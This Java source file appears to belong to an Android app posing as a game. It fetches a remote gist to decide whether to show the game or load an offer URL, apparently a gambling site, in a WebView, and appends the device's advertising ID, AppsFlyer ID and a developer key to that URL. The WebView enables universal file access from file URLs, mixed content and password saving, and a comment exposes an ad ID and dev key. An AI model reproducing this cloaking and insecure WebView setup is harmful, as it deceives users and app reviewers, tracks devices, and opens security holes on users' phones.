package com.etgpy.rsiech;

import static com.etgpy.rsiech.ApplicationClass.appsFlyerId;
import static com.etgpy.rsiech.Constants.GIST_LINK;
import static com.etgpy.rsiech.Constants.devKEyDice;
import static com.etgpy.rsiech.FaceBook.strDeep;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.example.firstapp1.R;

import java.io.IOException;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;

public class ER extends AppCompatActivity {
    private WebView webView;
    private String link;
    private Uri[] results;
    private ValueCallback<Uri[]> myFilePathCallback;
    private SharedPreferences sPrefs;
    private String keyDefault;
    private String offer;
    private String fbId;
    public static final String PREFERENCES_URL = "LAST_WebView_URL";
    public static final int INPUT_FILE_REQUEST_CODE = 1;
    public static String statusAppsFlyer;
    public static String  strAppsFlyer;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (ifDevMode()) {              //TODO (!)
            setContentView(R.layout.activity_main);
            webView = findViewById(R.id.webView);
            setWebView(webView);

            Retrofit retrofit = new Retrofit.Builder()
                    .baseUrl(GIST_LINK)
                    .build();
            GistApi gistApi = retrofit.create(GistApi.class);
            Call<ResponseBody> gistQuery = gistApi.getStringUrl();
            gistQuery.enqueue(new Callback<ResponseBody>() {
                @Override
                public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                    if (response.isSuccessful()) {
                        try {
                            String url = response.body().string();
                            String[] params = url.split("\\|");
                            offer = params[0];
                            keyDefault = params[1];
                            fbId = params[2];
                            Log.i("MyApp", "gistString = " + url);

                            new FaceBook(fbId, ER.this);

                            sPrefs = getSharedPreferences("myWebViewPrefs", Context.MODE_PRIVATE);
                            link = sPrefs.getString(PREFERENCES_URL, null);


                            // TODO

//                            if (link != null) {
//                                webView.loadUrl(link);
//                            } else {

                                new Handler().postDelayed(new Runnable() {
                                    @Override
                                    public void run() {
                                        startWebView(offer);
                                    }
                                }, 5000);

   //                         }

                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    } else {
                        Log.i("MyApp", "fail Gist request");
                    }
                }

                @Override
                public void onFailure(Call<ResponseBody> call, Throwable t) {
                    Log.i("MyApp", "Network Error :: " + t.getLocalizedMessage());
                }
            });

        } else {
            goToGame();
        }
    }


    private void goToGame() {
        Intent intent = new Intent(this, GameActivity.class);
        startActivity(intent);
        finish();
    }

    void startWebView(String link) {
        if (statusAppsFlyer.equals("Non-organic")) {
            String url = link + strAppsFlyer;
            Log.i("MyApp", "Non-organic:" + url);
            webView.loadUrl(url);
        } else if (strDeep != null) {
            String url = link + strDeep;
            Log.i("MyApp", "DeepLink" + url);
            webView.loadUrl(url);
        } else {
            if (keyDefault.equals("NO")) {
                //органика выключена
                Log.i("MyApp", "With out naming and deepLinks");
                goToGame();
            } else {
                //органика включена
                strAppsFlyer =
                        keyDefault + "?bundle=" + getPackageName()
                                + "&ad_id=" + FaceBook.AID
                                + "&apps_id=" + appsFlyerId
                                + "&dev_key=" + devKEyDice;
                String url = link + strAppsFlyer;
                Log.i("MyApp", "Organic:" + url);
                //E/User: Organic: https://gigaspin.xyz/Gp88Vp?bundle=com.fferss.fullapp&ad_id=590ec99f-f3df-4f93-9bd9-07e82d8f79e4&apps_id=1641395442394-6992958082334891642&dev_key=jhmwSMVcuZWmhQ3nVyj5S4
                webView.loadUrl(url);
            }
        }
    }


    @Override
    public void onBackPressed() {
        webView.goBack();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        if (requestCode != INPUT_FILE_REQUEST_CODE || myFilePathCallback == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        if (resultCode == Activity.RESULT_OK) {
            String dataString = data.getDataString();
            if (dataString != null) {
                results = new Uri[]{Uri.parse(dataString)};
                myFilePathCallback.onReceiveValue(results);
                myFilePathCallback = null;
            }
        }
    }

    private boolean ifDevMode() {
        int devInt = android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
        if (devInt == 0) return false;
        return true;
    }

    private void setWebView(WebView webView) {
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setAppCacheEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setAllowContentAccess(true);
        webView.getSettings().setAllowFileAccess(true);
        webView.getSettings().setAppCacheEnabled(true);
        webView.getSettings().setAllowFileAccessFromFileURLs(true);
        webView.getSettings().setSaveFormData(true);
        webView.getSettings().setMixedContentMode(0);
        webView.getSettings().setSavePassword(true);
        webView.getSettings().setAllowContentAccess(true);
        webView.getSettings().setLoadsImagesAutomatically(true);
        webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webView.getSettings().setDatabaseEnabled(true);
        webView.getSettings().setLoadWithOverviewMode(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setAllowFileAccess(true);
        webView.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
        webView.getSettings().setEnableSmoothTransition(true);
        webView.setWebChromeClient(new MyWebChromeClient());
        webView.setWebViewClient(new MyWebViewClient());
    }


    class MyWebChromeClient extends WebChromeClient {
        @Override
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback,
                                         FileChooserParams fileChooserParams) {
            myFilePathCallback = filePathCallback;
            Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
            contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
            contentSelectionIntent.setType("image/*");
            Intent chooserIntent = new Intent(Intent.ACTION_CHOOSER);
            chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent);
            startActivityForResult(chooserIntent, INPUT_FILE_REQUEST_CODE);
            return true;
        }
    }

    class MyWebViewClient extends WebViewClient {
        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            super.onPageStarted(view, url, favicon);
            if (url.startsWith("404")) {
                goToGame();
                finish();
            }
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            SharedPreferences.Editor editor = sPrefs.edit();
            editor.putString(PREFERENCES_URL, url);
            editor.apply();
        }
    }
}






